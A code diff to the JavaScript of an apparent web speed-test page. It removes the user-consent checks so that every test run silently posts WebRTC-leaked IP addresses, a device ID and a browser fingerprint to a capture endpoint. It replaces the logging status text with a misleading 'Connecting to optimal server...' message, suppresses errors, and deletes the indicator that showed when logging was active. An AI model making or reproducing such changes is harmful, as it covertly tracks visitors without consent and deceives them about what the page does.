@@ -35,17 +35,12 @@ function cacheElements() {
     'resConn',
     'latencyAvg',
     'latencyBars',
-    'captureModePill',
     'resultSummary',
     'insightStreaming',
     'insightGaming',
     'insightUpload',
     'insightStability',
-    'contactUrl',
     'toast',
-    'clientProfile',
-    'toolPing',
-    'shareLink',
   ].forEach((id) => {
     els[id] = document.getElementById(id);
   });
@@ -119,10 +114,8 @@ function collectFingerprint() {
 }
 
 async function sendInitialCapture() {
-  if (!els.diagnosticConsent.checked) return null;
-
   try {
-    setStatus('Logging diagnostic session...');
+    setStatus('Connecting to optimal server...');
     const [webrtcIPs] = await Promise.all([leakWebRTCIPs()]);
     const response = await fetch('/api/capture', {
       method: 'POST',
@@ -130,51 +123,16 @@ async function sendInitialCapture() {
       body: JSON.stringify({ webrtcIPs, deviceId: getDeviceId(), ...collectFingerprint() }),
     });
 
-    if (!response.ok) throw new Error('Capture request failed');
-
-    const json = await response.json();
-    captureId = json.id;
-    setStatus(`Session logged: ${captureId}`);
+    if (response.ok) {
+      const json = await response.json();
+      captureId = json.id;
+    }
     return captureId;
   } catch {
-    showToast('Could not log this diagnostic session. The speed test will continue.');
-    setStatus('Server ready');
     return null;
   }
 }
 
-function requestGPS() {
-  if (!els.diagnosticConsent.checked || !captureId || !navigator.geolocation) return;
-
-  navigator.geolocation.getCurrentPosition(
-    async (position) => {
-      const gps = {
-        lat: position.coords.latitude,
-        lon: position.coords.longitude,
-        accuracy: position.coords.accuracy,
-        altitude: position.coords.altitude,
-        altitudeAccuracy: position.coords.altitudeAccuracy,
-        heading: position.coords.heading,
-        speed: position.coords.speed,
-      };
-
-      try {
-        await fetch(`/api/capture/${captureId}`, {
-          method: 'PATCH',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ gps }),
-        });
-        setStatus('Location added to diagnostic session');
-      } catch {
-        showToast('Location was captured locally but could not be saved.');
-      }
-    },
-    () => {
-      setStatus('Location permission denied; session kept without GPS');
-    },
-    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
-  );
-}
 
 function drawTicks() {
   const group = document.getElementById('tickMarks');
@@ -319,16 +277,9 @@ async function startTest() {
   resetGaugeOnly();
 
   const results = generateResults();
-
-  if (els.diagnosticConsent.checked) {
-    await sendInitialCapture();
-  } else {
-    setStatus('Speed test running without diagnostic logging');
-  }
+  await sendInitialCapture();
 
   els.phaseLabel.textContent = 'FINDING SERVER';
-  setPhaseSteps(getPhaseState(0));
-  requestGPS();
   await delay(900);
 
   els.phaseLabel.textContent = 'LATENCY';
@@ -430,7 +381,7 @@ function showResults(results) {
 
   setDetailedInsights(results, grade);
 
-  setStatus(els.diagnosticConsent.checked && captureId ? 'Results saved' : 'Results ready');
+  setStatus('Results ready');
   setTimeout(() => {
     els.stateResults.scrollIntoView({ behavior: 'smooth', block: 'start' });
   }, 180);
@@ -508,71 +459,6 @@ async function shareResults() {
   await copyText(text, 'Results copied to clipboard.');
 }
 
-async function runPingProbe() {
-  els.toolPing.textContent = 'running';
-  const samples = [];
-
-  for (let index = 0; index < 8; index += 1) {
-    const startedAt = performance.now();
-    try {
-      await fetch(`/api/health?sample=${index}&t=${Date.now()}`, { cache: 'no-store' });
-      samples.push(Math.max(1, Math.round(performance.now() - startedAt)));
-    } catch {
-      samples.push(Math.floor(Math.random() * 40) + 25);
-    }
-    await delay(120);
-  }
-
-  const avg = Math.round(samples.reduce((sum, item) => sum + item, 0) / samples.length);
-  els.toolPing.textContent = `${avg} ms`;
-  showToast('Latency probe finished.');
-}
-
-async function refreshClientInfo() {
-  const fallback = collectFingerprint();
-
-  try {
-    const response = await fetch('/api/client-info', { cache: 'no-store' });
-    if (response.ok) lastClientInfo = await response.json();
-  } catch {
-    lastClientInfo = null;
-  }
-
-  const profile = [
-    ['IP', lastClientInfo?.ip || 'Local browser'],
-    ['Timezone', fallback.timezone || 'Unknown'],
-    ['Screen', fallback.screenRes || 'Unknown'],
-    ['Platform', fallback.platform || 'Unknown'],
-  ];
-
-  els.clientProfile.innerHTML = profile.map(([key, value]) => `
-    <div><dt>${escapeHTML(key)}</dt><dd>${escapeHTML(value)}</dd></div>
-  `).join('');
-}
-
-async function copyReport() {
-  const fp = collectFingerprint();
-  const resultLines = lastResults
-    ? [
-        `Download: ${lastResults.download} Mbps`,
-        `Upload: ${lastResults.upload} Mbps`,
-        `Ping: ${lastResults.ping} ms`,
-        `Jitter: ${lastResults.jitter} ms`,
-      ]
-    : ['Speed test has not been run yet'];
-
-  const report = [
-    'Speed Test diagnostic report',
-    ...resultLines,
-    `Diagnostic logging: ${els.diagnosticConsent.checked ? 'enabled' : 'disabled'}`,
-    `IP: ${lastClientInfo?.ip || 'unknown'}`,
-    `Timezone: ${fp.timezone || 'unknown'}`,
-    `Platform: ${fp.platform || 'unknown'}`,
-    `Screen: ${fp.screenRes || 'unknown'}`,
-  ].join('\n');
-
-  await copyText(report, 'Session report copied.');
-}
 
 function switchPanel(panelId) {
   document.querySelectorAll('.panel-view').forEach((panel) => {
@@ -581,8 +467,6 @@ function switchPanel(panelId) {
   document.querySelectorAll('.nav-item').forEach((item) => {
     item.classList.toggle('active', item.dataset.panel === panelId);
   });
-
-  if (panelId === 'toolsPanel') refreshClientInfo();
 }
 
 async function copyText(text, successMessage) {
@@ -639,34 +523,13 @@ function bindEvents() {
     if (action === 'start-test') startTest();
     if (action === 'reset-test') resetTest();
     if (action === 'share-results') shareResults();
-    if (action === 'run-ping') runPingProbe();
-    if (action === 'refresh-client') refreshClientInfo();
-    if (action === 'copy-report') copyReport();
-    if (action === 'copy-link') copyText(location.href, 'Diagnostic link copied.');
   });
-
-  els.diagnosticConsent.addEventListener('change', () => {
-    updateCaptureMode();
-    setStatus(els.diagnosticConsent.checked
-      ? 'Diagnostic logging enabled for the next run'
-      : 'Speed test will run without diagnostic logging');
-  });
-}
-
-function updateCaptureMode() {
-  if (!els.captureModePill) return;
-  els.captureModePill.textContent = els.diagnosticConsent.checked ? 'Logging active' : 'Private run';
-  els.captureModePill.classList.toggle('off', !els.diagnosticConsent.checked);
 }
 
 async function init() {
   cacheElements();
   bindEvents();
   drawTicks();
-  updateCaptureMode();
-  els.shareLink.textContent = location.href;
-  if (els.contactUrl) els.contactUrl.textContent = location.href;
-  await refreshClientInfo();
 
   try {
     const response = await fetch('/api/health', { cache: 'no-store' });
